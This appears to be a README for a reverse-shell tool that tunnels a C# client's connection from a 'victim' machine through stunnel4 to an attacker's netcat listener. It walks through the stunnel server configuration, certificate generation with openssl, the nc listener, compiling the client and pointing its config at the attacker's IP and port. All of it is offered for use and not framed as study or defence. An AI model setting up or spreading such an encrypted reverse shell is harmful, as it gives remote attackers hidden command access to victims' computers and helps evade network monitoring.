# STunnell_RevShell
A Reverse shell through Stunnel.
## Architecture
- Client Net4.8 C#
- Server Stunnell4
- 
## Scenario:
Client is the victim, that executes the connection to the server (attacker) that serves stunnell.
The client SSL authentication must match the CN specified creating the server certificate (example: lguerra.local)

    sslStream.AuthenticateAsClient("lguerra.local");
	
	
Server is the attacker running stunnel4. Follows the configuration:
	
	cat /etc/stunnel/stunnel.conf 
	[nc]
	client = no
	accept = 9999
	connect = 127.0.0.1:6666
	cert = /etc/stunnel/lguerra.pem
	
	
Here we have stunnel listening for incoming connection on port 9999, then forwards the connection to port 6666 where we will have nc listening.

## Create the certificate on the server
	
	openssl genrsa -out key.pem 2048
	openssl req -new -x509 -key key.pem -out cert.pem -days 1095
	cat key.pem cert.pem > /etc/stunnel/stunnel.pem
 
The CN value must be used to authenticate the client as previously indicated.
Start stunnell
	
 service stunnel4 start
	
check if works:

    netstat -tulp | grep 9999
	  Active Internet connections (only servers)
	  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	  tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      19338/stunnel4
	  ...
	
Then we can lunch nc to listen on port 6666 as configurated on stunnel

	nc -lvp 6666
	
## Compile the client:
	
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Program.cs
	
	
	finally we can execute the client file ReverseShell2_SSL.exe
	the configuration file (config) must be present in the same directory of the exe, configurated according to the attacker machine:
		ip:<attacker machine IP>
		port:<listen stunnel port on the attacker machine>
		CN:<CN name as set on the stunnel certificate> 

	
	we should read the following on the CMD program shell
	
		Starting decoding, please wait...
		Certificate revocation list checked: False
		Remote cert was issued to CN=zinzloun, OU=IT Sec, O=Umbrella Corp., L=Chianti, S=Italy, C=IT and is valid from 20/07/2019 11:29:08 until 19/07/2022 11:29:08.
	
		

